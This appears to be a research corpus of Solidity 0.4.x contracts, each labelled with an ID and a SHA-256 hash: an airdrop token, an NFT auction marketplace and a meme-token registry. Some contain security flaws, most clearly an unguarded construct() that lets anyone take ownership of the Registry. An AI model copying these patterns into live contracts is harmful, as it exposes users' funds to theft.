        return true;
    }
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);        
        balances[_to] = balances[_to].add(_amount);
        Distr(_to, _amount);
        Transfer(address(0), _to, _amount);
        return true;
    }
    function doAirdrop(address _participant, uint _amount) internal {
        require( _amount > 0 );      
        require( totalDistributed < totalSupply );
        balances[_participant] = balances[_participant].add(_amount);
        totalDistributed = totalDistributed.add(_amount);
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
        Airdrop(_participant, _amount, balances[_participant]);
        Transfer(address(0), _participant, _amount);
    }
    function adminClaimAirdrop(address _participant, uint _amount) public onlyOwner {        
        doAirdrop(_participant, _amount);
    }
    function adminClaimAirdropMultiple(address[] _addresses, uint _amount) public onlyOwner {        
        for (uint i = 0; i < _addresses.length; i++) doAirdrop(_addresses[i], _amount);
    }
    function updateTokensPerEth(uint _tokensPerEth) public onlyOwner {        
        tokensPerEth = _tokensPerEth;
        TokensPerEthUpdated(_tokensPerEth);
    }
    function () external payable {
        getTokens();
     }
    function getTokens() payable canDistr  public {
        uint256 tokens = 0;
        require( msg.value >= minContribution );
        require( msg.value > 0 );
        tokens = tokensPerEth.mul(msg.value) / 1 ether;        
        address investor = msg.sender;
        if (tokens > 0) {
            distr(investor, tokens);
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(msg.sender, _to, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        AltcoinToken t = AltcoinToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    function withdraw() onlyOwner public {
        address myAddress = this;
        uint256 etherBalance = myAddress.balance;
        owner.transfer(etherBalance);
    }
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        Burn(burner, _value);
    }
    function withdrawAltcoinTokens(address _tokenContract) onlyOwner public returns (bool) {
        AltcoinToken token = AltcoinToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}
```

## RQ1_8a2daa767297

SHA-256 `e66f2902be8cff51e733da3d3e1aa9b470740f412a293529e336c83478645085`

```solidity
pragma solidity 0.4.24;
library AddressUtils {
  function isContract(address _addr) internal view returns (bool) {
    uint256 size;
    assembly { size := extcodesize(_addr) }
    return size > 0;
  }
}
library SafeMath {
  function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {
    if (_a == 0) {
      return 0;
    }
    c = _a * _b;
    assert(c / _a == _b);
    return c;
  }
  function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
    return _a / _b;
  }
  function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
    assert(_b <= _a);
    return _a - _b;
  }
  function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {
    c = _a + _b;
    assert(c >= _a);
    return c;
  }
}
contract Ownable {
  address public owner;
  event OwnershipRenounced(address indexed previousOwner);
  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );
  constructor() public {
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  function renounceOwnership() public onlyOwner {
    emit OwnershipRenounced(owner);
    owner = address(0);
  }
  function transferOwnership(address _newOwner) public onlyOwner {
    _transferOwnership(_newOwner);
  }
  function _transferOwnership(address _newOwner) internal {
    require(_newOwner != address(0));
    emit OwnershipTransferred(owner, _newOwner);
    owner = _newOwner;
  }
}
interface ERC165 {
  function supportsInterface(bytes4 _interfaceId)
    external
    view
    returns (bool);
}
contract ERC721Basic is ERC165 {
  bytes4 internal constant InterfaceId_ERC721 = 0x80ac58cd;
  bytes4 internal constant InterfaceId_ERC721Exists = 0x4f558e79;
  bytes4 internal constant InterfaceId_ERC721Enumerable = 0x780e9d63;
  bytes4 internal constant InterfaceId_ERC721Metadata = 0x5b5e139f;
  event Transfer(
    address indexed _from,
    address indexed _to,
    uint256 indexed _tokenId
  );
  event Approval(
    address indexed _owner,
    address indexed _approved,
    uint256 indexed _tokenId
  );
  event ApprovalForAll(
    address indexed _owner,
    address indexed _operator,
    bool _approved
  );
  function balanceOf(address _owner) public view returns (uint256 _balance);
  function ownerOf(uint256 _tokenId) public view returns (address _owner);
  function exists(uint256 _tokenId) public view returns (bool _exists);
  function approve(address _to, uint256 _tokenId) public;
  function getApproved(uint256 _tokenId)
    public view returns (address _operator);
  function setApprovalForAll(address _operator, bool _approved) public;
  function isApprovedForAll(address _owner, address _operator)
    public view returns (bool);
  function transferFrom(address _from, address _to, uint256 _tokenId) public;
  function safeTransferFrom(address _from, address _to, uint256 _tokenId)
    public;
  function safeTransferFrom(
    address _from,
    address _to,
    uint256 _tokenId,
    bytes _data
  )
    public;
}
contract IMarketplace {
    function createAuction(
        uint256 _tokenId,
        uint128 startPrice,
        uint128 endPrice,
        uint128 duration
    )
        external;
}
contract AnimalMarketplace is Ownable, IMarketplace {
    using AddressUtils for address;
    using SafeMath for uint256;
    uint8 internal percentFee = 5;
    ERC721Basic private erc721Contract;
    struct Auction {
        address tokenOwner;
        uint256 startTime;
        uint128 startPrice;
        uint128 endPrice;
        uint128 duration;
    }
    struct AuctionEntry {
        uint256 keyIndex;
        Auction value;
    }
    struct TokenIdAuctionMap {
        mapping(uint256 => AuctionEntry) data;
        uint256[] keys;
    }
    TokenIdAuctionMap private auctions;
    event AuctionBoughtEvent(
        uint256 tokenId,
        address previousOwner,
        address newOwner,
        uint256 pricePaid
    );
    event AuctionCreatedEvent(
        uint256 tokenId,
        uint128 startPrice,
        uint128 endPrice,
        uint128 duration
    );
    event AuctionCanceledEvent(uint256 tokenId);
    modifier isNotFromContract() {
        require(!msg.sender.isContract());
        _;
    }
    constructor(ERC721Basic _erc721Contract) public {
        erc721Contract = _erc721Contract;
    }
    function createAuction(
        uint256 _tokenId,
        uint128 _startPrice,
        uint128 _endPrice,
        uint128 _duration
    )
        external
    {
        require(msg.sender == address(erc721Contract));
        AuctionEntry storage entry = auctions.data[_tokenId];
        require(entry.keyIndex == 0);
        address tokenOwner = erc721Contract.ownerOf(_tokenId);
        erc721Contract.transferFrom(tokenOwner, address(this), _tokenId);
        entry.value = Auction({
            tokenOwner: tokenOwner,
            startTime: block.timestamp,
            startPrice: _startPrice,
            endPrice: _endPrice,
            duration: _duration
        });
        entry.keyIndex = ++auctions.keys.length;
        auctions.keys[entry.keyIndex - 1] = _tokenId;
        emit AuctionCreatedEvent(_tokenId, _startPrice, _endPrice, _duration);
    }
    function cancelAuction(uint256 _tokenId) external {
        AuctionEntry storage entry = auctions.data[_tokenId];
        Auction storage auction = entry.value;
        address sender = msg.sender;
        require(sender == auction.tokenOwner);
        erc721Contract.transferFrom(address(this), sender, _tokenId);
        deleteAuction(_tokenId, entry);
        emit AuctionCanceledEvent(_tokenId);
    }
    function buyAuction(uint256 _tokenId)
        external
        payable
        isNotFromContract
    {
        AuctionEntry storage entry = auctions.data[_tokenId];
        require(entry.keyIndex > 0);
        Auction storage auction = entry.value;
        address sender = msg.sender;
        address tokenOwner = auction.tokenOwner;
        uint256 auctionPrice = calculateCurrentPrice(auction);
        uint256 pricePaid = msg.value;
        require(pricePaid >= auctionPrice);
        deleteAuction(_tokenId, entry);
        refundSender(sender, pricePaid, auctionPrice);
        payTokenOwner(tokenOwner, auctionPrice);
        erc721Contract.transferFrom(address(this), sender, _tokenId);
        emit AuctionBoughtEvent(_tokenId, tokenOwner, sender, auctionPrice);
    }
    function getAuctionByTokenId(uint256 _tokenId)
        external
        view
        returns (
            uint256 tokenId,
            address tokenOwner,
            uint128 startPrice,
            uint128 endPrice,
            uint256 startTime,
            uint128 duration,
            uint256 currentPrice,
            bool exists
        )
    {
        AuctionEntry storage entry = auctions.data[_tokenId];
        Auction storage auction = entry.value;
        uint256 calculatedCurrentPrice = calculateCurrentPrice(auction);
        return (
            entry.keyIndex > 0 ? _tokenId : 0,
            auction.tokenOwner,
            auction.startPrice,
            auction.endPrice,
            auction.startTime,
            auction.duration,
            calculatedCurrentPrice,
            entry.keyIndex > 0
        );
    }
    function getAuctionByIndex(uint256 _auctionIndex)
        external
        view
        returns (
            uint256 tokenId,
            address tokenOwner,
            uint128 startPrice,
            uint128 endPrice,
            uint256 startTime,
            uint128 duration,
            uint256 currentPrice,
            bool exists
        )
    {
        if (_auctionIndex >= auctions.keys.length) {
            return (0, address(0), 0, 0, 0, 0, 0, false);
        }
        uint256 currentTokenId = auctions.keys[_auctionIndex];
        Auction storage auction = auctions.data[currentTokenId].value;
        uint256 calculatedCurrentPrice = calculateCurrentPrice(auction);
        return (
            currentTokenId,
            auction.tokenOwner,
            auction.startPrice,
            auction.endPrice,
            auction.startTime,
            auction.duration,
            calculatedCurrentPrice,
            true
        );
    }
    function getAuctionsCount() external view returns (uint256 auctionsCount) {
        return auctions.keys.length;
    }
    function isOnAuction(uint256 _tokenId) public view returns (bool onAuction) {
        return auctions.data[_tokenId].keyIndex > 0;
    }
    function withdrawContract() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }
    function refundSender(address _sender, uint256 _pricePaid, uint256 _auctionPrice) private {
        uint256 etherToRefund = _pricePaid.sub(_auctionPrice);
        if (etherToRefund > 0) {
            _sender.transfer(etherToRefund);
        }
    }
    function payTokenOwner(address _tokenOwner, uint256 _auctionPrice) private {
        uint256 etherToPay = _auctionPrice.sub(_auctionPrice * percentFee / 100);
        if (etherToPay > 0) {
            _tokenOwner.transfer(etherToPay);
        }
    }
    function deleteAuction(uint256 _tokenId, AuctionEntry storage _entry) private {
        uint256 keysLength = auctions.keys.length;
        if (_entry.keyIndex <= keysLength) {
            auctions.data[auctions.keys[keysLength - 1]].keyIndex = _entry.keyIndex;
            auctions.keys[_entry.keyIndex - 1] = auctions.keys[keysLength - 1];
            auctions.keys.length = keysLength - 1;
            delete auctions.data[_tokenId];
        }
    }
    function calculateCurrentPrice(Auction storage _auction) private view returns (uint256) {
        uint256 secondsInProgress = block.timestamp - _auction.startTime;
        if (secondsInProgress >= _auction.duration) {
            return _auction.endPrice;
        }
        int256 totalPriceChange = int256(_auction.endPrice) - int256(_auction.startPrice);
        int256 currentPriceChange =
            totalPriceChange * int256(secondsInProgress) / int256(_auction.duration);
        int256 calculatedPrice = int256(_auction.startPrice) + int256(currentPriceChange);
        return uint256(calculatedPrice);
    }
}
```

## RQ1_2d5de0155ecf

SHA-256 `7f10cf80d8cecfa397bbf6664d4151184b57bcb9c1926301328e8d4498c802ae`

```solidity
pragma solidity ^0.4.24;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
pragma solidity ^0.4.24;
library AddressUtils {
  function isContract(address addr) internal view returns (bool) {
    uint256 size;
    assembly { size := extcodesize(addr) }  // solium-disable-line security/no-inline-assembly
    return size > 0;
  }
}
pragma solidity ^0.4.24;
contract DelegateProxy {
  function delegatedFwd(address _dst, bytes _calldata) internal {
    require(isContract(_dst));
    assembly {
      let result := delegatecall(sub(gas, 10000), _dst, add(_calldata, 0x20), mload(_calldata), 0, 0)
      let size := returndatasize
      let ptr := mload(0x40)
      returndatacopy(ptr, 0, size)
      switch result case 0 {revert(ptr, size)}
      default {return (ptr, size)}
    }
  }
  function isContract(address _target) internal view returns (bool) {
    uint256 size;
    assembly {size := extcodesize(_target)}
    return size > 0;
  }
}
pragma solidity ^0.4.13;
contract DSAuthority {
  function canCall(
    address src, address dst, bytes4 sig
  ) public view returns (bool);
}
contract DSAuthEvents {
  event LogSetAuthority (address indexed authority);
  event LogSetOwner     (address indexed owner);
}
contract DSAuth is DSAuthEvents {
  DSAuthority  public  authority;
  address      public  owner;
  function DSAuth() public {
    owner = msg.sender;
    LogSetOwner(msg.sender);
  }
  function setOwner(address owner_)
  public
  auth
  {
    owner = owner_;
    LogSetOwner(owner);
  }
  function setAuthority(DSAuthority authority_)
  public
  auth
  {
    authority = authority_;
    LogSetAuthority(authority);
  }
  modifier auth {
    require(isAuthorized(msg.sender, msg.sig));
    _;
  }
  function isAuthorized(address src, bytes4 sig) internal view returns (bool) {
    if (src == address(this)) {
      return true;
    } else if (src == owner) {
      return true;
    } else if (authority == DSAuthority(0)) {
      return false;
    } else {
      return authority.canCall(src, this, sig);
    }
  }
}
pragma solidity ^0.4.24;
contract ERC721Basic {
  event Transfer(address indexed _from, address indexed _to, uint256 _tokenId, uint256 _timestamp);
  event Approval(address indexed _owner, address indexed _approved, uint256 _tokenId);
  event ApprovalForAll(address indexed _owner, address indexed _operator, bool _approved);
  function balanceOf(address _owner) public view returns (uint256 _balance);
  function ownerOf(uint256 _tokenId) public view returns (address _owner);
  function exists(uint256 _tokenId) public view returns (bool _exists);
  function approve(address _to, uint256 _tokenId) public;
  function getApproved(uint256 _tokenId) public view returns (address _operator);
  function setApprovalForAll(address _operator, bool _approved) public;
  function isApprovedForAll(address _owner, address _operator) public view returns (bool);
  function transferFrom(address _from, address _to, uint256 _tokenId) public;
  function safeTransferFrom(address _from, address _to, uint256 _tokenId) public;
  function safeTransferFrom(
    address _from,
    address _to,
    uint256 _tokenId,
    bytes _data
  )
  public;
}
pragma solidity ^0.4.24;
contract ERC721Enumerable is ERC721Basic {
  function totalSupply() public view returns (uint256);
  function tokenOfOwnerByIndex(address _owner, uint256 _index) public view returns (uint256 _tokenId);
  function tokenByIndex(uint256 _index) public view returns (uint256);
}
contract ERC721Metadata is ERC721Basic {
  function name() public view returns (string _name);
  function symbol() public view returns (string _symbol);
  function tokenURI(uint256 _tokenId) public view returns (address);
}
contract ERC721 is ERC721Basic, ERC721Enumerable, ERC721Metadata {
}
pragma solidity ^0.4.24;
contract ERC721BasicToken is ERC721Basic {
  using SafeMath for uint256;
  using AddressUtils for address;
  bytes4 constant ERC721_RECEIVED = 0xf0b9e5ba;
  mapping (uint256 => address) internal tokenOwner;
  mapping (uint256 => address) internal tokenApprovals;
  mapping (address => uint256) internal ownedTokensCount;
  mapping (address => mapping (address => bool)) internal operatorApprovals;
  modifier onlyOwnerOf(uint256 _tokenId) {
    require(ownerOf(_tokenId) == msg.sender);
    _;
  }
  modifier canTransfer(uint256 _tokenId) {
    require(isApprovedOrOwner(msg.sender, _tokenId));
    _;
  }
  function balanceOf(address _owner) public view returns (uint256) {
    require(_owner != address(0));
    return ownedTokensCount[_owner];
  }
  function ownerOf(uint256 _tokenId) public view returns (address) {
    address owner = tokenOwner[_tokenId];
    require(owner != address(0));
    return owner;
  }
  function exists(uint256 _tokenId) public view returns (bool) {
    address owner = tokenOwner[_tokenId];
    return owner != address(0);
  }
  function approve(address _to, uint256 _tokenId) public {
    address owner = ownerOf(_tokenId);
    require(_to != owner);
    require(msg.sender == owner || isApprovedForAll(owner, msg.sender));
    if (getApproved(_tokenId) != address(0) || _to != address(0)) {
      tokenApprovals[_tokenId] = _to;
      Approval(owner, _to, _tokenId);
    }
  }
  function getApproved(uint256 _tokenId) public view returns (address) {
    return tokenApprovals[_tokenId];
  }
  function setApprovalForAll(address _to, bool _approved) public {
    require(_to != msg.sender);
    operatorApprovals[msg.sender][_to] = _approved;
    ApprovalForAll(msg.sender, _to, _approved);
  }
  function isApprovedForAll(address _owner, address _operator) public view returns (bool) {
    return operatorApprovals[_owner][_operator];
  }
  function transferFrom(address _from, address _to, uint256 _tokenId) public canTransfer(_tokenId) {
    require(_from != address(0));
    require(_to != address(0));

    clearApproval(_from, _tokenId);
    removeTokenFrom(_from, _tokenId);
    addTokenTo(_to, _tokenId);

    Transfer(_from, _to, _tokenId, now);
  }
  function safeTransferFrom(
    address _from,
    address _to,
    uint256 _tokenId
  )
  public
  canTransfer(_tokenId)
  {
    safeTransferFrom(_from, _to, _tokenId, "");
  }
  function safeTransferFrom(
    address _from,
    address _to,
    uint256 _tokenId,
    bytes _data
  )
  public
  canTransfer(_tokenId)
  {
    transferFrom(_from, _to, _tokenId);
    require(checkAndCallSafeTransfer(_from, _to, _tokenId, _data));
  }
  function isApprovedOrOwner(address _spender, uint256 _tokenId) internal view returns (bool) {
    address owner = ownerOf(_tokenId);
    return _spender == owner || getApproved(_tokenId) == _spender || isApprovedForAll(owner, _spender);
  }
  function _mint(address _to, uint256 _tokenId) internal {
    require(_to != address(0));
    addTokenTo(_to, _tokenId);
    Transfer(address(0), _to, _tokenId, now);
  }
  function _burn(address _owner, uint256 _tokenId) internal {
    clearApproval(_owner, _tokenId);
    removeTokenFrom(_owner, _tokenId);
    Transfer(_owner, address(0), _tokenId, now);
  }
  function clearApproval(address _owner, uint256 _tokenId) internal {
    require(ownerOf(_tokenId) == _owner);
    if (tokenApprovals[_tokenId] != address(0)) {
      tokenApprovals[_tokenId] = address(0);
      Approval(_owner, address(0), _tokenId);
    }
  }
  function addTokenTo(address _to, uint256 _tokenId) internal {
    require(tokenOwner[_tokenId] == address(0));
    tokenOwner[_tokenId] = _to;
    ownedTokensCount[_to] = ownedTokensCount[_to].add(1);
  }
  function removeTokenFrom(address _from, uint256 _tokenId) internal {
    require(ownerOf(_tokenId) == _from);
    ownedTokensCount[_from] = ownedTokensCount[_from].sub(1);
    tokenOwner[_tokenId] = address(0);
  }
  function checkAndCallSafeTransfer(
    address _from,
    address _to,
    uint256 _tokenId,
    bytes _data
  )
  internal
  returns (bool)
  {
    if (!_to.isContract()) {
      return true;
    }
    bytes4 retval = ERC721Receiver(_to).onERC721Received(_from, _tokenId, _data);
    return (retval == ERC721_RECEIVED);
  }
}
pragma solidity ^0.4.21;
contract ERC721Receiver {
  bytes4 constant ERC721_RECEIVED = 0xf0b9e5ba;
  function onERC721Received(address _from, uint256 _tokenId, bytes _data) public returns(bytes4);
}
pragma solidity ^0.4.21;
contract ERC721Holder is ERC721Receiver {
  function onERC721Received(address, uint256, bytes) public returns(bytes4) {
    return ERC721_RECEIVED;
  }
}
pragma solidity ^0.4.24;
contract ERC721Token is ERC721, ERC721BasicToken {
  string internal name_;
  string internal symbol_;
  mapping(address => uint256[]) internal ownedTokens;
  mapping(uint256 => uint256) internal ownedTokensIndex;
  uint256[] internal allTokens;
  mapping(uint256 => uint256) internal allTokensIndex;
  mapping(uint256 => address) internal tokenURIs;
  function ERC721Token(string _name, string _symbol) public {
    name_ = _name;
    symbol_ = _symbol;
  }
  function name() public view returns (string) {
    return name_;
  }
  function symbol() public view returns (string) {
    return symbol_;
  }
  function tokenURI(uint256 _tokenId) public view returns (address) {
    require(exists(_tokenId));
    return tokenURIs[_tokenId];
  }
  function tokenOfOwnerByIndex(address _owner, uint256 _index) public view returns (uint256) {
    require(_index < balanceOf(_owner));
    return ownedTokens[_owner][_index];
  }
  function totalSupply() public view returns (uint256) {
    return allTokens.length;
  }
  function tokenByIndex(uint256 _index) public view returns (uint256) {
    require(_index < totalSupply());
    return allTokens[_index];
  }
  function _setTokenURI(uint256 _tokenId, address _uri) internal {
    require(exists(_tokenId));
    tokenURIs[_tokenId] = _uri;
  }
  function addTokenTo(address _to, uint256 _tokenId) internal {
    super.addTokenTo(_to, _tokenId);
    uint256 length = ownedTokens[_to].length;
    ownedTokens[_to].push(_tokenId);
    ownedTokensIndex[_tokenId] = length;
  }
  function removeTokenFrom(address _from, uint256 _tokenId) internal {
    super.removeTokenFrom(_from, _tokenId);
    uint256 tokenIndex = ownedTokensIndex[_tokenId];
    uint256 lastTokenIndex = ownedTokens[_from].length.sub(1);
    uint256 lastToken = ownedTokens[_from][lastTokenIndex];
    ownedTokens[_from][tokenIndex] = lastToken;
    ownedTokens[_from][lastTokenIndex] = 0;
    ownedTokens[_from].length--;
    ownedTokensIndex[_tokenId] = 0;
    ownedTokensIndex[lastToken] = tokenIndex;
  }
  function _mint(address _to, uint256 _tokenId) internal {
    super._mint(_to, _tokenId);
    allTokensIndex[_tokenId] = allTokens.length;
    allTokens.push(_tokenId);
  }
}
pragma solidity ^0.4.24;
contract EternalDb is DSAuth {
  enum Types {UInt, String, Address, Bytes, Bytes32, Boolean, Int}
  event EternalDbEvent(bytes32[] records, uint[] values, uint timestamp);
  function EternalDb(){
  }
  mapping(bytes32 => uint) UIntStorage;
  function getUIntValue(bytes32 record) constant returns (uint){
    return UIntStorage[record];
  }
  function getUIntValues(bytes32[] records) constant returns (uint[] results){
    results = new uint[](records.length);
    for (uint i = 0; i < records.length; i++) {
      results[i] = UIntStorage[records[i]];
    }
  }
  function setUIntValue(bytes32 record, uint value)
  auth
  {
    UIntStorage[record] = value;
    bytes32[] memory records = new bytes32[](1);
    records[0] = record;
    uint[] memory values = new uint[](1);
    values[0] = value;
    emit EternalDbEvent(records, values, now);
  }
  function setUIntValues(bytes32[] records, uint[] values)
  auth
  {
    for (uint i = 0; i < records.length; i++) {
      UIntStorage[records[i]] = values[i];
    }
    emit EternalDbEvent(records, values, now);
  }
  function deleteUIntValue(bytes32 record)
  auth
  {
    delete UIntStorage[record];
  }
  mapping(bytes32 => string) StringStorage;
  function getStringValue(bytes32 record) constant returns (string){
    return StringStorage[record];
  }
  function setStringValue(bytes32 record, string value)
  auth
  {
    StringStorage[record] = value;
  }
  function deleteStringValue(bytes32 record)
  auth
  {
    delete StringStorage[record];
  }
  mapping(bytes32 => address) AddressStorage;
  function getAddressValue(bytes32 record) constant returns (address){
    return AddressStorage[record];
  }
  function setAddressValues(bytes32[] records, address[] values)
  auth
  {
    for (uint i = 0; i < records.length; i++) {
      AddressStorage[records[i]] = values[i];
    }
  }
  function setAddressValue(bytes32 record, address value)
  auth
  {
    AddressStorage[record] = value;
  }
  function deleteAddressValue(bytes32 record)
  auth
  {
    delete AddressStorage[record];
  }
  mapping(bytes32 => bytes) BytesStorage;

  function getBytesValue(bytes32 record) constant returns (bytes){
    return BytesStorage[record];
  }
  function setBytesValue(bytes32 record, bytes value)
  auth
  {
    BytesStorage[record] = value;
  }
  function deleteBytesValue(bytes32 record)
  auth
  {
    delete BytesStorage[record];
  }
  mapping(bytes32 => bytes32) Bytes32Storage;
  function getBytes32Value(bytes32 record) constant returns (bytes32){
    return Bytes32Storage[record];
  }
  function getBytes32Values(bytes32[] records) constant returns (bytes32[] results){
    results = new bytes32[](records.length);
    for (uint i = 0; i < records.length; i++) {
      results[i] = Bytes32Storage[records[i]];
    }
  }
  function setBytes32Value(bytes32 record, bytes32 value)
  auth
  {
    Bytes32Storage[record] = value;
  }
  function setBytes32Values(bytes32[] records, bytes32[] values)
  auth
  {
    for (uint i = 0; i < records.length; i++) {
      Bytes32Storage[records[i]] = values[i];
    }
  }
  function deleteBytes32Value(bytes32 record)
  auth
  {
    delete Bytes32Storage[record];
  }
  mapping(bytes32 => bool) BooleanStorage;
  function getBooleanValue(bytes32 record) constant returns (bool){
    return BooleanStorage[record];
  }
  function getBooleanValues(bytes32[] records) constant returns (bool[] results){
    results = new bool[](records.length);
    for (uint i = 0; i < records.length; i++) {
      results[i] = BooleanStorage[records[i]];
    }
  }
  function setBooleanValue(bytes32 record, bool value)
  auth
  {
    BooleanStorage[record] = value;
  }
  function setBooleanValues(bytes32[] records, bool[] values)
  auth
  {
    for (uint i = 0; i < records.length; i++) {
      BooleanStorage[records[i]] = values[i];
    }
  }
  function deleteBooleanValue(bytes32 record)
  auth
  {
    delete BooleanStorage[record];
  }
  mapping(bytes32 => int) IntStorage;

  function getIntValue(bytes32 record) constant returns (int){
    return IntStorage[record];
  }
  function getIntValues(bytes32[] records) constant returns (int[] results){
    results = new int[](records.length);
    for (uint i = 0; i < records.length; i++) {
      results[i] = IntStorage[records[i]];
    }
  }
  function setIntValue(bytes32 record, int value)
  auth
  {
    IntStorage[record] = value;
  }
  function setIntValues(bytes32[] records, int[] values)
  auth
  {
    for (uint i = 0; i < records.length; i++) {
      IntStorage[records[i]] = values[i];
    }
  }
  function deleteIntValue(bytes32 record)
  auth
  {
    delete IntStorage[record];
  }
}
pragma solidity ^0.4.24;
contract MemeToken is ERC721Token {
  Registry public registry;
  modifier onlyRegistryEntry() {
    require(registry.isRegistryEntry(msg.sender),"MemeToken: onlyRegistryEntry failed");
    _;
  }
  function MemeToken(Registry _registry)
  ERC721Token("MemeToken", "MEME")
  {
    registry = _registry;
  }
  function mint(address _to, uint256 _tokenId)
  onlyRegistryEntry
  public
  {
    super._mint(_to, _tokenId);
    tokenURIs[_tokenId] = msg.sender;
  }
  function safeTransferFromMulti(
    address _from,
    address _to,
    uint256[] _tokenIds,
    bytes _data
  ) {
    for (uint i = 0; i < _tokenIds.length; i++) {
      safeTransferFrom(_from, _to, _tokenIds[i], _data);
    }
  }
}
pragma solidity ^0.4.24;
contract MutableForwarder is DelegateProxy, DSAuth {
  address public target = 0xBEeFbeefbEefbeEFbeEfbEEfBEeFbeEfBeEfBeef;
  function setTarget(address _target) public auth {
    target = _target;
  }
  function() payable {
    delegatedFwd(target, msg.data);
  }
}
pragma solidity ^0.4.24;
contract Registry is DSAuth {
  address private dummyTarget; 
  bytes32 public constant challengePeriodDurationKey = keccak256(abi.encodePacked("challengePeriodDuration"));
  bytes32 public constant commitPeriodDurationKey = keccak256(abi.encodePacked("commitPeriodDuration"));
  bytes32 public constant revealPeriodDurationKey = keccak256(abi.encodePacked("revealPeriodDuration"));
  bytes32 public constant depositKey = keccak256(abi.encodePacked("deposit"));
  bytes32 public constant challengeDispensationKey = keccak256(abi.encodePacked("challengeDispensation"));
  bytes32 public constant voteQuorumKey = keccak256(abi.encodePacked("voteQuorum"));
  bytes32 public constant maxTotalSupplyKey = keccak256(abi.encodePacked("maxTotalSupply"));
  bytes32 public constant maxAuctionDurationKey = keccak256(abi.encodePacked("maxAuctionDuration"));
  event MemeConstructedEvent(address registryEntry, uint version, address creator, bytes metaHash, uint totalSupply, uint deposit, uint challengePeriodEnd);
  event MemeMintedEvent(address registryEntry, uint version, address creator, uint tokenStartId, uint tokenEndId, uint totalMinted);
  event ChallengeCreatedEvent(address registryEntry, uint version, address challenger, uint commitPeriodEnd, uint revealPeriodEnd, uint rewardPool, bytes metahash);
  event VoteCommittedEvent(address registryEntry, uint version, address voter, uint amount);
  event VoteRevealedEvent(address registryEntry, uint version, address voter, uint option);
  event VoteAmountClaimedEvent(address registryEntry, uint version, address voter);
  event VoteRewardClaimedEvent(address registryEntry, uint version, address voter, uint amount);
  event ChallengeRewardClaimedEvent(address registryEntry, uint version, address challenger, uint amount);
  event ParamChangeConstructedEvent(address registryEntry, uint version, address creator, address db, string key, uint value, uint deposit, uint challengePeriodEnd);
  event ParamChangeAppliedEvent(address registryEntry, uint version);
  EternalDb public db;
  bool private wasConstructed;
  function construct(EternalDb _db)
  external
  {
    require(address(_db) != 0x0, "Registry: Address can't be 0x0");

    db = _db;
    wasConstructed = true;
    owner = msg.sender;
  }
  modifier onlyFactory() {
    require(isFactory(msg.sender), "Registry: Sender should be factory");
    _;
  }
  modifier onlyRegistryEntry() {
    require(isRegistryEntry(msg.sender), "Registry: Sender should registry entry");
    _;
  }
  modifier notEmergency() {
    require(!isEmergency(),"Registry: Emergency mode is enable");
    _;
  }
  function setFactory(address _factory, bool _isFactory)
  external
  auth
  {
    db.setBooleanValue(keccak256(abi.encodePacked("isFactory", _factory)), _isFactory);
  }
  function addRegistryEntry(address _registryEntry)
  external
  onlyFactory
  notEmergency
  {
    db.setBooleanValue(keccak256(abi.encodePacked("isRegistryEntry", _registryEntry)), true);
  }
  function setEmergency(bool _isEmergency)
  external
  auth
  {
    db.setBooleanValue("isEmergency", _isEmergency);
  }
  function fireMemeConstructedEvent(uint version, address creator, bytes metaHash, uint totalSupply, uint deposit, uint challengePeriodEnd)
  public
  onlyRegistryEntry
  {
    emit MemeConstructedEvent(msg.sender, version, creator, metaHash, totalSupply, deposit, challengePeriodEnd);
  }
  function fireMemeMintedEvent(uint version, address creator, uint tokenStartId, uint tokenEndId, uint totalMinted)
  public
  onlyRegistryEntry
  {
    emit MemeMintedEvent(msg.sender, version, creator, tokenStartId, tokenEndId, totalMinted);
  }
  function fireChallengeCreatedEvent(uint version, address challenger, uint commitPeriodEnd, uint revealPeriodEnd, uint rewardPool, bytes metahash)
  public
  onlyRegistryEntry
  {
